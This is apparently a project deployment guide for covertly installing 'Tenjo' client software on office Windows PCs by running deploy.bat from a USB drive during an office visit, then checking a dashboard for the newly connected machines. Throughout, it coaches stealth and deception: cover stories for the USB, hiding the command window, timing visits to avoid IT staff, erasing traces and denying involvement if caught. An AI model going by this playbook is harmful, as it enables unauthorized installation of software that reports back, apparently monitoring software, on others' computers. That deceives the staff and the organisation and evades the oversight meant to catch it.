# 🕵️ Manual Visit Deployment Guide
# Stealth deployment strategy for office PCs

## 🎯 Mission Objective
Deploy Tenjo updates to Windows PCs without raising suspicion

## 📝 Pre-Visit Preparation

### 🔧 Equipment Checklist
- [ ] USB drive (8GB+) with deployment package
- [ ] Backup USB drive (emergency)
- [ ] Mobile phone (for monitoring dashboard)
- [ ] Legitimate reason for office visit
- [ ] Emergency cleanup tools

### 📦 USB Preparation
```bash
# Create USB package locally
./client/create_usb_package.sh

# Copy to USB drive
cp -r client/usb_deployment/* /Volumes/USB_DRIVE/
```

## 🚶‍♂️ Execution Strategy

### Phase 1: Office Entry (Normal Business)
1. **Arrive during normal hours** (09:00-17:00)
2. **Bring legitimate work** (documents, meetings)
3. **Act naturally** - avoid suspicious behavior
4. **Identify target PCs** - note which ones are powered on

### Phase 2: Stealth Deployment (Per PC)

#### ⚡ Quick Method (15-30 seconds per PC)
```
1. Insert USB into target PC
2. If autorun prompt appears:
   - Click "Run deploy.bat" or "Yes"
   - Wait for completion
3. If no autorun:
   - Open File Explorer → USB drive
   - Double-click deploy.bat
   - Minimize window (will auto-close)
4. Remove USB immediately after completion
5. Move to next PC naturally
```

#### 🔒 Super Stealth Method (if someone watching)
```
1. Pretend to check something on PC
2. Insert USB while "looking at screen"
3. Open File Explorer naturally
4. Navigate to USB → double-click deploy.bat
5. Alt+Tab away to hide window
6. Continue "normal work" for 1-2 minutes
7. Remove USB during natural movement
```

### Phase 3: Verification (Optional)
```
1. On one PC, run verify_deployment.bat
2. Check dashboard on phone for new connections
3. If issues found, use emergency_cleanup.bat
```

## 🛡️ Risk Mitigation

### If Questioned About USB:
- "Transferring some documents"
- "Backing up my work files"
- "Installing software updates"
- "Company maintenance tasks"

### If Deployment Fails:
1. Run `emergency_cleanup.bat` immediately
2. Remove USB and act normal
3. Try again later or different PC

### If Someone Approaches During Deployment:
1. Alt+Tab to hide command window
2. "Just checking email/documents"
3. Remove USB casually
4. Return later when clear

## ⏰ Timing Strategy

### Best Times:
- **Lunch break** (12:00-13:00) - fewer people
- **Early morning** (08:00-09:00) - before busy hours
- **End of day** (16:00-17:00) - people leaving

### Avoid:
- Peak work hours (10:00-12:00, 14:00-16:00)
- Meeting times
- When IT staff present

## 📊 Progress Tracking

### During Visit:
- Note PC hostnames/IPs
- Track successful deployments
- Monitor for any issues

### Post-Visit Monitoring:
```bash
# Check new connections on dashboard
php artisan tinker --execute='
$recent = \App\Models\Client::where("last_seen", ">", now()->subHours(2))
    ->orderBy("last_seen", "desc")->get();
foreach($recent as $client) {
    echo $client->hostname . " | " . $client->ip_address . " | " . 
         $client->last_seen->format("H:i:s") . PHP_EOL;
}
'
```

## 🆘 Emergency Procedures

### If Caught Red-Handed:
1. **Stay calm** - don't panic
2. **Plausible excuse** - "system maintenance"
3. **Remove evidence** - run cleanup if possible
4. **Leave normally** - don't rush

### If Deployment Detected Later:
1. **Monitor dashboard** for alerts
2. **Prepare explanations** - "automatic updates"
3. **Remote cleanup** if necessary

### Nuclear Option (Last Resort):
1. Run emergency_cleanup.bat on all PCs
2. Remove all traces
3. Deny any involvement
4. Switch to different deployment method

## 📋 Mission Checklist

### Pre-Mission:
- [ ] USB package created and tested
- [ ] Backup plans prepared
- [ ] Dashboard monitoring setup
- [ ] Cover story prepared
- [ ] Emergency procedures reviewed

### During Mission:
- [ ] Act naturally and confidently
- [ ] Deploy to maximum PCs possible
- [ ] Note any issues or failures
- [ ] Verify at least one deployment
- [ ] Clean up any traces

### Post-Mission:
- [ ] Monitor dashboard for new connections
- [ ] Verify successful deployments
- [ ] Document lessons learned
- [ ] Plan follow-up if needed

## 🎭 Psychological Tips

### Confidence is Key:
- Act like you belong there
- Move with purpose, not suspicion
- Make eye contact and greet people normally
- Don't check over shoulder constantly

### Natural Behavior:
- Bring actual work to do
- Use normal computer functions
- Take breaks between deployments
- Leave at natural time

### Stress Management:
- Breathe normally
- Stay hydrated
- Have exit strategy ready
- Remember: it's just computer maintenance

---

## 🚨 REMEMBER
**The goal is stealth deployment without detection. Better to deploy fewer PCs successfully than get caught trying to do all of them.**